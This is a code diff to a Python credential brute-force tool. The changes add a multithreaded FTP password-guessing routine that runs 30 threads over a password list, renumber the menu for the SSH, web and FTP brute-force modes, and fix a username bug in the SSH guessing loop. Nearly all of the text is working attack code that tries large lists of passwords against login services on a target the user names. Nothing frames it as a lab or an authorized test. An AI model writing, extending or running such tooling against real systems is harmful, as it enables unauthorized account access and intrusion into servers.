@@ -1,10 +1,13 @@
-from sre_parse import State
+#from sre_parse import State
 import paramiko, sys, os, socket
 import threading, time
 from pyparsing import Word
 from rich.console import Console
 from art import *
 import requests
+import ftplib
+from threading import Thread
+import queue
 
 console=Console()
 stop_flag=0
@@ -28,6 +31,9 @@ class brute_force:
         bf.single_password - test on manual single password
         bf.code - Which bruteforce we want to perform
         '''
+        bf.q = queue.Queue() # Queue for threads
+        bf.port = 21 # default for ftp connect
+        bf.n_threads = 30 # default threads number
         bf.target = ""
         bf.username= ""
         bf.stop_flag = 0
@@ -35,7 +41,7 @@ class brute_force:
         bf.single_password = ""
         bf.code = 0
         bf.state = ""
-        
+
     @staticmethod
     def entry_message():
         '''
@@ -57,10 +63,12 @@ class brute_force:
         print()
         console.print("[+]For help press - H")
         console.print("[+]To import your passwords list - i / I")
-        console.print("[+]For SSH Brute force - 2")
+        console.print("[+]For SSH Brute force - 1")
+        console.print("[+]For Web brute force - 2")
         console.print("[+]For FTP Brute force - 3")
-        console.print("[+]For Web brute force - 4")
         
+
+   
     def read_help(bf):
         with open('./Brute Force/help.txt', encoding='utf8') as f:
             for line in f:
@@ -78,7 +86,7 @@ class brute_force:
         try: # try to connect to the target through port 22 with username and pw through our password bulk
             ssh.connect(bf.target,port=22, username=bf.username, password=bf.single_password)
             stop_flag = 1
-            console.print('[+] Found password: @@@@@@@@@@@@@@@@@@@@' + bf.single_password + ' , for account: ' + username)
+            console.print('[+] Found password: @@@@@@@@@@@@@@@@@@@@' + bf.single_password + ' , for account: ' + bf.username)
         except: # If the password not correct we move forward to the next one and close connection
             console.print( '[-] Incorrect login, the password doesn\'t match: ' + bf.single_password)
         ssh.close()
@@ -113,8 +121,9 @@ class brute_force:
         
     #posting
     def post(bf):
-        print("Please enter target")
-        bf.target = input()
+        #print("Please enter target")
+        console.print("Your target is: ",bf.target,style = "dim cyan")
+        #bf.target = input()
         data_dict ={"username" : "admin", "password":"password"}
         with open(bf.passwords_bulk, 'r') as file:
             for line in file.readlines():
@@ -124,6 +133,52 @@ class brute_force:
                #print(response.content)
                 if "Login failed" not in str(response.content):
                     print("[+] Password found --->" + bf.single_password)
+
+    def connect_ftp(bf):
+        while True:
+            # get the password from the queue
+            password = bf.q.get()
+            # initialize the FTP server object
+            server = ftplib.FTP()
+            print("[!] Trying", password)
+            try:
+                # tries to connect to FTP server with a timeout of 5
+                server.connect(bf.target, bf.port, timeout=5)
+                # login using the credentials (user & password)
+                server.login(bf.username, password)
+            except ftplib.error_perm:
+                # login failed, wrong credentials
+                pass
+            else:
+                # correct credentials
+                print(f"[+] Found credentials: ")
+                print(f"\tHost: ")
+                print(f"\tUser:")
+                print(f"\tPassword: {password}")
+                # we found the password, let's clear the queue
+                with bf.q.mutex:
+                    bf.q.queue.clear()
+                    bf.q.all_tasks_done.notify_all()
+                    bf.q.unfinished_tasks = 0
+            finally:
+                # notify the queue that the task is completed for this password
+                bf.q.task_done()
+
+    def thread_ftp(bf):
+        passwords = open("Brute Force\passwords.txt").read().split("\n")
+        print("[+] Passwords to try:", len(passwords))
+        # put all passwords to the queue
+        for password in passwords:
+            bf.q.put(password)
+        # create `n_threads` that runs that function
+        for t in range(bf.n_threads):
+            thread = Thread(target=bf.connect_ftp)
+            # will end when the main thread end
+            thread.daemon = True
+            thread.start()
+        # wait for the queue to be empty
+        bf.q.join()
+
     def init_main(bf):
         '''
         Here we init the function to run, we run the functions in order to the request of the user
@@ -160,6 +215,14 @@ class brute_force:
             bf.state = input()
             if(bf.state == 'b' or bf.state == 'B'):
                 bf.init_main()
+        elif(bf.state =='3'):
+            console.print("You chose FTP Brute Force")
+            console.print("Please enter your target (include 'http://' and login page) : ")
+            bf.target = input()
+            console.print("Please enter username to check with(reccomendated - 'admin') :")
+            bf.username = input()
+            bf.thread_ftp()
+            
 
 
 
